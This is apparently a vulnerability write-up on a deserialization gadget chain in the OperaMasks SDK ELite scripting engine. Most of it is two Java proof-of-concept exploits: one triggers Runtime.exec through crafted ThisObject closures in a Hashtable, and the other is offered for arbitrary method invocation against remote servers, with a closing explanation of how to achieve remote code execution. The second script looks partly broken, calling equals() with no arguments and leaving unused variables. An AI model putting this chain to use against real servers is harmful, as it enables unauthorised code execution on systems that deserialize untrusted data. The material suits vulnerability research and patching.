OperaMasks SDK (Software Development Kit) is a complete set of Web application development toolkits launched by Apusic (Shanghai Fanruan). Its core is OperaMasks, a Web framework based on the JavaServer Faces (JSF) specification, as well as its native Ajax engine, Rich Components, development plug-ins and runtime libraries.
The OperaMasks SDK ELite scripting engine contains classes that may be used to deserialize the construction of the exploit chain, resulting in command execution and gaining privileges.

You can download the dependencies required for the ELite scripting engine from the following link: https://sourceforge.net/projects/aom-elite, or it is already built into the OperaMasks SDK.
Its jar package is named elite-src.jar or elite.jar + elite-api.jar
It is worth noting that after importing elite-src.jar, you may still not be able to use the classes in it, even if you can see the required classes in it.
If you want to reproduce stably, it is recommended to download elite-0.5.0.zip directly. In its elite-0.5.0\elite-0.5.0\lib directory, there are two jar packages we need, elite.jar and elite-api.jar.

The following script is used to verify that it can be used for deserialization vulnerabilities：

import elite.lang.Closure;
import org.operamasks.el.eval.ELContextImpl;
import org.operamasks.el.eval.EvaluationContext;
import org.operamasks.el.eval.closure.ClassDefinition;
import org.operamasks.el.eval.closure.ClosureObject;
import org.operamasks.el.eval.closure.ThisObject;
import org.operamasks.el.parser.ELNode;

import javax.el.BeanELResolver;
import javax.el.CompositeELResolver;
import javax.el.ELContext;
import javax.el.MethodInfo;
import java.io.*;
import java.util.Hashtable;
import java.util.Map;

public class testFinal {
    public testFinal() throws IOException {
    }

    public static void main(String[] args) throws Exception {
        CompositeELResolver resolver = new CompositeELResolver();
        resolver.add(new BeanELResolver());
        ELContext ctx = new ELContextImpl(resolver);
        java.lang.reflect.Method m = org.operamasks.el.eval.ELEngine.class.getDeclaredMethod("setCurrentELContext", javax.el.ELContext.class);
        m.setAccessible(true);
        m.invoke(null, ctx);

        Class<?> ec = Class.forName("org.operamasks.el.eval.EvaluationContext");
        EvaluationContext ecInstance = (EvaluationContext) ec.getDeclaredConstructor(ELContext.class).newInstance(ctx);

        ClassDefinition classDefinition = new ClassDefinition(ecInstance, new ELNode.CLASSDEF(1, "", "", "", new String[]{""}, new ELNode.DEFINE[]{}, new ELNode.DEFINE[]{}));

        ThisObject thisObject = new ThisObject() {

            @Override
            protected void addInterface(Class var1) {

            }

            @Override
            protected Class[] getInterfaces() {
                return new Class[0];
            }

            @Override
            protected void setOwner(ClosureObject var1) {

            }

            @Override
            protected void init(ELContext var1, Closure[] var2) {

            }

            @Override
            protected Object createProxy(ELContext var1) {
                return null;
            }

            @Override
            public ClassDefinition get_class() {
                return classDefinition;
            }

            @Override
            public ClosureObject get_owner() {
                return null;
            }

            @Override
            public Object get_proxy() {
                return null;
            }

            @Override
            public Closure get_closure(ELContext var1, String var2) {
                return null;
            }

            @Override
            public Map<String, Closure> get_closures(ELContext var1) {
                return null;
            }

            @Override
            protected Closure get_my_closure(ELContext var1, String var2) {
                return new Closure() {
                    @Override
                    public Object invoke(ELContext ctx, Closure[] args) {
                        try {
                            // This is the key point of command execution
                            Runtime.getRuntime().exec("calc");
                        } catch (Exception e) {
                            e.printStackTrace();
                        }
                        return null;
                    }

                    @Override
                    public int arity(ELContext var1) {
                        return 0;
                    }

                    @Override
                    public MethodInfo getMethodInfo(ELContext var1) {
                        return null;
                    }

                    @Override
                    public Object getValue(ELContext elContext) {
                        return null;
                    }

                    @Override
                    public void setValue(ELContext elContext, Object o) {

                    }

                    @Override
                    public boolean isReadOnly(ELContext elContext) {
                        return false;
                    }

                    @Override
                    public Class<?> getType(ELContext elContext) {
                        return null;
                    }

                    @Override
                    public Class<?> getExpectedType() {
                        return null;
                    }

                    @Override
                    public String getExpressionString() {
                        return null;
                    }

                    @Override
                    public boolean equals(Object o) {
                        return false;
                    }

                    @Override
                    public int hashCode() {
                        return 0;
                    }

                    @Override
                    public boolean isLiteralText() {
                        return false;
                    }
                };
            }

            @Override
            protected Map<String, Closure> getClosureMap() {
                return null;
            }
        };

        Hashtable<Object, Object> hashtable = new Hashtable<>();
        hashtable.put(thisObject, "test");
        hashtable.put(new ThisObject() {
            @Override
            protected void addInterface(Class var1) {

            }

            @Override
            protected Class[] getInterfaces() {
                return new Class[0];
            }

            @Override
            protected void setOwner(ClosureObject var1) {

            }

            @Override
            protected void init(ELContext var1, Closure[] var2) {

            }

            @Override
            protected Object createProxy(ELContext var1) {
                return null;
            }

            @Override
            public ClassDefinition get_class() {
                return classDefinition;
            }

            @Override
            public ClosureObject get_owner() {
                return null;
            }

            @Override
            public Object get_proxy() {
                return null;
            }

            @Override
            public Closure get_closure(ELContext var1, String var2) {
                return null;
            }

            @Override
            public Map<String, Closure> get_closures(ELContext var1) {
                return null;
            }

            @Override
            protected Closure get_my_closure(ELContext var1, String var2) {
                return null;
            }

            @Override
            protected Map<String, Closure> getClosureMap() {
                return null;
            }
        }, "test");

        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos);
        oos.writeObject(hashtable);
        oos.flush();
        oos.close();

        ByteArrayInputStream bais = new ByteArrayInputStream(baos.toByteArray());
        ObjectInputStream ois = new ObjectInputStream(bais);
        ois.readObject();
        ois.close();
    }
}

The above code is just for proof of concept. 
To test a remote environment, you can use the following code, which can execute any method of any class, although the parameters are uncontrollable.
You can change "base" to any class you want to call, and "exec" to any method you want to execute：

import org.apache.xalan.xsltc.trax.TemplatesImpl;
import org.operamasks.el.eval.ELContextImpl;
import org.operamasks.el.eval.EvaluationContext;
import org.operamasks.el.eval.closure.ClassDefinition;
import org.operamasks.el.eval.closure.LiteralClosure;
import org.operamasks.el.eval.closure.MethodClosure;
import org.operamasks.el.eval.closure.ThisObject;
import org.operamasks.el.parser.ELNode;
import org.operamasks.el.resolver.MethodResolver;
import org.operamasks.el.eval.ELEngine;
import org.operamasks.util.SimpleCache;

import javax.el.BeanELResolver;
import javax.el.CompositeELResolver;
import javax.el.ELContext;
import javax.el.ELResolver;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.*;
import java.util.concurrent.ConcurrentSkipListSet;

public class basicThisObjectTest {
    public static void main(String[] args) throws Exception {
        // Method exec = Runtime.class.getMethod("exec", String.class);
        Method exec = TemplatesImpl.class.getMethod("getOutputProperties");
        // Runtime base = Runtime.getRuntime();
        TemplatesImpl base = new TemplatesImpl();
        LiteralClosure literalClosure = new LiteralClosure(base);

        HashMap<Object, Object> hashMap = new HashMap<>();
        hashMap.put("equals", literalClosure);

        // CompositeELResolver resolver = new CompositeELResolver();
        // resolver.add(new BeanELResolver());
        // ELContext ctx = new ELContextImpl(resolver);
        // ctx.putContext(MethodResolver.class, new MethodResolver());
        Class<?> methodClosure = Class.forName("org.operamasks.el.resolver.SingleMethodClosure");
        Constructor<?> methodClosureConstructor = methodClosure.getDeclaredConstructor(Method.class);
        methodClosureConstructor.setAccessible(true);
        MethodClosure singleMethodClosure = (MethodClosure)methodClosureConstructor.newInstance(exec);

        // ConcurrentSkipListSet concurrentSkipListSet = new ConcurrentSkipListSet();
        // concurrentSkipListSet.add(singleMethodClosure);

        // MethodResolver methodResolver = new MethodResolver();
        // Field globalField = MethodResolver.class.getDeclaredField("global");
        // globalField.setAccessible(true);
        // Object globalMap = globalField.get(methodResolver);
        //
        // Field expandoMapField = globalMap.getClass().getDeclaredField("expandoMap");
        // expandoMapField.setAccessible(true);
        // Object expandoMap = expandoMapField.get(globalMap);
        //
        // Field mapField = expandoMap.getClass().getDeclaredField("map");
        // mapField.setAccessible(true);
        // @SuppressWarnings("unchecked")
        // Map<String,SortedSet<?>> theMap = (Map<String,SortedSet<?>>)mapField.get(expandoMap);
        // theMap.put("__call__", concurrentSkipListSet);

        Class<Method> baseClass = Method.class;

        Class<?> methodMapCls = Class.forName("org.operamasks.el.resolver.MethodResolver$MethodMap");
        Constructor<?> mmCtor = methodMapCls.getDeclaredConstructor();
        mmCtor.setAccessible(true);
        Object methodMap = mmCtor.newInstance();
        Field mapField = methodMapCls.getDeclaredField("map");
        mapField.setAccessible(true);
        @SuppressWarnings("unchecked")
        Map<String, MethodClosure> internalMap =
                (Map<String, MethodClosure>) mapField.get(methodMap);
        internalMap.clear();
        internalMap.put("__call__", singleMethodClosure);
        // internalMap.put("__call__", singleMethodClosure2);
        @SuppressWarnings("unchecked")
        SimpleCache<Class<?>, Object> newCache = new SimpleCache<>(200);
        newCache.put(base.getClass(), methodMap);
        MethodResolver resolver = new MethodResolver();
        Field cacheField = MethodResolver.class.getDeclaredField("cache");
        cacheField.setAccessible(true);
        cacheField.set(resolver, newCache);

        ELContext elContext = ELEngine.createELContext();
        elContext.putContext(MethodResolver.class, resolver);
        Method setCurrentELContext = ELEngine.class.getDeclaredMethod("setCurrentELContext", new Class[]{ELContext.class});
        setCurrentELContext.setAccessible(true);
        setCurrentELContext.invoke(null, new Object[]{elContext});

        Class<?> ec = Class.forName("org.operamasks.el.eval.EvaluationContext");
        EvaluationContext ecInstance = (EvaluationContext)ec.getDeclaredConstructor(ELContext.class).newInstance(elContext);
        ClassDefinition classDefinition = new ClassDefinition(ecInstance, new ELNode.CLASSDEF(1, "", "", "", new String[]{""}, new ELNode.DEFINE[]{}, new ELNode.DEFINE[]{}));

        Class<?> basicClass = Class.forName("org.operamasks.el.eval.closure.BasicThisObject");
        Constructor<?> basicClassConstructor = basicClass.getDeclaredConstructor(ELContext.class, ClassDefinition.class, Map.class);
        basicClassConstructor.setAccessible(true);
        ThisObject basicThisObject = (ThisObject)basicClassConstructor.newInstance(elContext, classDefinition, hashMap);

        HashMap<Object, Object> hashMap2 = new HashMap<>();
        hashMap2.put("calc", "calc");
        ThisObject basicThisObject2 = (ThisObject)basicClassConstructor.newInstance(elContext, classDefinition, hashMap);

        LiteralClosure literalClosure1 = new LiteralClosure("calc");
        basicThisObject.equals();

    }
}



After the script is executed, the calculator will pop up twice. The first execution is when the object is put into the hashtable for the second time. The second execution is when deserializing.
This deserialization chain only uses classes in the Hashtable and ELite dependencies, indicating that any server that uses this dependency may be vulnerable to deserialization attacks.
We imagine that a certain interface of a Java server can deserialize foreign data. This server has an ELite script engine dependency, so we can send the serialized data in the above script to it, thereby remotely RCE.
